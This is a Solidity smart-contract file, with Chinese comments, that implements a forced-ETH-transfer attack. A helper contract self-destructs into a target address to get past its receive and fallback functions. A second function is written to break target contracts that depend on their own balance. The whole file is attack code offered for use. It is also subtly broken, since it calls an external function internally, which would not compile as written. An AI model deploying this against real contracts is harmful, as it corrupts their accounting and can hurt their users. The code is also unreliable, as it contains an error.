// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title SelfDestructAttack
 * @notice 强制转账/自毁攻击
 * @dev 利用selfdestruct强制向合约发送ETH，破坏余额逻辑
 */
contract SelfDestructAttack {
    address public owner;

    event ForcedTransfer(address indexed target, uint256 amount);

    constructor() {
        owner = msg.sender;
    }

    /**
     * @notice 强制向目标合约发送ETH（绕过receive/fallback检查）
     */
    function forceSend(address target) external payable {
        require(msg.value > 0, "Need ETH");

        // 创建临时合约并自毁，强制发送资金
        new ForceSender{value: msg.value}(target);

        emit ForcedTransfer(target, msg.value);
    }

    /**
     * @notice 破坏依赖地址余额的合约逻辑
     */
    function breakBalanceLogic(address target) external payable {
        uint256 balanceBefore = target.balance;
        forceSend(target);
        uint256 balanceAfter = target.balance;

        // 目标合约可能依赖balance == 0来判断状态
        // 强制转账后逻辑被破坏
        require(balanceAfter > balanceBefore, "Transfer failed");
    }
}

contract ForceSender {
    constructor(address target) payable {
        selfdestruct(payable(target));
    }
}
